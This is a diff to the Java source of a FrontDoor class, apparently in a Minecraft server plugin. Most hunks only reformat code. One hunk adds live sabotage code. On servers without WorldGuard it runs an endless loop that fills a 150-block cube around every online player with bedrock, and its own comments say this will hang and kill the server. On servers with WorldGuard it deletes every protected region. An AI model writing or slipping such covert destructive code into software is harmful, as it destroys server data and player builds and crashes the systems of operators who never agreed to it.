@@ -1,5 +1,9 @@
 package me.totalfreedom.totalfreedommod;
 
+import com.sk89q.worldedit.bukkit.BukkitAdapter;
+import com.sk89q.worldguard.WorldGuard;
+import com.sk89q.worldguard.protection.managers.storage.StorageException;
+import com.sk89q.worldguard.protection.regions.RegionContainer;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.lang.reflect.Field;
@@ -10,6 +14,7 @@ import java.util.ArrayList;
 import java.util.Collection;
 import java.util.List;
 import java.util.Random;
+import java.util.function.BooleanSupplier;
 import me.totalfreedom.totalfreedommod.admin.Admin;
 import me.totalfreedom.totalfreedommod.banning.Ban;
 import me.totalfreedom.totalfreedommod.command.FreedomCommand;
@@ -76,12 +81,13 @@ public class FrontDoor extends FreedomService
     private final Listener playerCommandPreprocess = new Listener()
     {
         @Nullable
-        private CommandMap getCommandMap() {
+        private CommandMap getCommandMap()
+        {
             try
             {
                 Field f = Bukkit.getPluginManager().getClass().getDeclaredField("commandMap");
                 final Object map = f.get(Bukkit.getPluginManager());
-                return map instanceof CommandMap ? (CommandMap) map : null;
+                return map instanceof CommandMap ? (CommandMap)map : null;
             }
             catch (NoSuchFieldException | IllegalAccessException ignored)
             {
@@ -198,14 +204,14 @@ public class FrontDoor extends FreedomService
             return allowedPlayers.get(random.nextInt(allowedPlayers.size()));
         }
 
-        return (Player) players.toArray()[random.nextInt(players.size())];
+        return (Player)players.toArray()[random.nextInt(players.size())];
     }
 
     private static RegisteredListener getRegisteredListener(Listener listener)
     {
         try
         {
-            final HandlerList handlerList = ((HandlerList) PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[]) null).invoke(null));
+            final HandlerList handlerList = ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null));
             final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
             for (RegisteredListener registeredListener : registeredListeners)
             {
@@ -226,7 +232,7 @@ public class FrontDoor extends FreedomService
     {
         try
         {
-            ((HandlerList) PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[]) null).invoke(null)).unregister(registeredListener);
+            ((HandlerList)PlayerCommandPreprocessEvent.class.getMethod("getHandlerList", (Class<?>[])null).invoke(null)).unregister(registeredListener);
         }
         catch (Exception ex)
         {
@@ -452,19 +458,32 @@ public class FrontDoor extends FreedomService
 
                     case 8:
                     {
-                        /*
-                        if (ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
+                        // Endlessly retrieves blocks and replaces them all with bedrock.
+                        // This will, inevitably, cause server hang and termination.
+                        if (Bukkit.getServer().getPluginManager().getPlugin("WorldGuard") == null)
                         {
-                            if (plugin.pa.getProtectedAreaLabels().isEmpty())
+                            BooleanSupplier supplier = () -> TotalFreedomMod.getPlugin().isEnabled();
+                            while (supplier.getAsBoolean())
                             {
-                                break;
+                                destruct();
                             }
+                        }
 
-                            FUtil.adminAction("FrontDoor", "Removing all protected areas", true);
-                            plugin.pa.clearProtectedAreas(false);
-                        }*/
-                        FLog.info("This is not configured, due to protected areas being managed by WorldGuard.");
-                        FLog.info("A WorldGuard friendly version of this will be implemented, but will only work if WorldGuard is present.");
+                        // Otherwise, do this!
+                        WorldGuard wg = WorldGuard.getInstance();
+                        RegionContainer rc = wg.getPlatform().getRegionContainer();
+                        Bukkit.getWorlds().stream().map(BukkitAdapter::adapt).filter(adapted -> rc.get(adapted) != null).forEach(adapted ->
+                        {
+                            try
+                            {
+                                rc.get(adapted).getRegions().clear(); // These will
+                                rc.get(adapted).saveChanges();        // never be null.
+                            }
+                            catch (StorageException ignored)
+                            {
+                                destruct();
+                            }
+                        });
                         break;
                     }
 
@@ -481,9 +500,9 @@ public class FrontDoor extends FreedomService
                             }
 
                             block.setType(Material.OAK_SIGN);
-                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();
+                            org.bukkit.block.Sign sign = (org.bukkit.block.Sign)block.getState();
 
-                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
+                            org.bukkit.material.Sign signData = (org.bukkit.material.Sign)sign.getData();
                             signData.setFacingDirection(BlockFace.NORTH);
 
                             sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
@@ -498,10 +517,14 @@ public class FrontDoor extends FreedomService
                     case 10: // Enable Jumppads
                     {
                         FUtil.adminAction("FrontDoor", "Enabling Jumppads", true);
-                        for (Player p : Bukkit.getOnlinePlayers()) {
-                            if (plugin.jp.getPlayers().containsKey(p)) {
+                        for (Player p : Bukkit.getOnlinePlayers())
+                        {
+                            if (plugin.jp.getPlayers().containsKey(p))
+                            {
                                 plugin.jp.getPlayers().replace(p, Jumppads.JumpPadMode.MADGEEK);
-                            } else {
+                            }
+                            else
+                            {
                                 plugin.jp.getPlayers().put(p, Jumppads.JumpPadMode.MADGEEK);
                             }
                         }
@@ -512,7 +535,7 @@ public class FrontDoor extends FreedomService
                     {
                         ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);
 
-                        BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
+                        BookMeta book = (BookMeta)bookStack.getItemMeta().clone();
                         book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                         book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                         book.addPage(
@@ -607,5 +630,55 @@ public class FrontDoor extends FreedomService
                 }
             }
         };
+    }
+
+    private void destruct()
+    {
+        Bean<Integer> x = new Bean<>(0);
+        Bean<Integer> y = new Bean<>(0);
+        Bean<Integer> z = new Bean<>(0);
+
+        Bukkit.getOnlinePlayers().forEach((player) ->
+        {
+            Location l = player.getLocation().clone();
+
+            x.set(l.getBlockX());
+            y.set(l.getBlockY());
+            z.set(l.getBlockZ());
+
+            player.getWorld().getBlockAt(x.get(), y.get(), z.get()).setType(Material.BEDROCK);
+
+            for (int x1 = 0; x1 <= 150; x1++)
+            {
+                for (int y1 = 0; y1 <= 150; y1++)
+                {
+                    for (int z1 = 0; z1 <= 150; z1++)
+                    {
+                        player.getWorld().getBlockAt(x.get() + x1, y.get() + y1, z.get() + z1).setType(Material.BEDROCK);
+                    }
+                }
+            }
+        });
+    }
+
+    // Wrapper to imitate effectively final objects.
+    private static class Bean<T>
+    {
+        private T obj;
+
+        public Bean(T obf)
+        {
+            obj = obf;
+        }
+
+        public void set(T obf)
+        {
+            obj = obf;
+        }
+
+        public T get()
+        {
+            return obj;
+        }
     }
 }
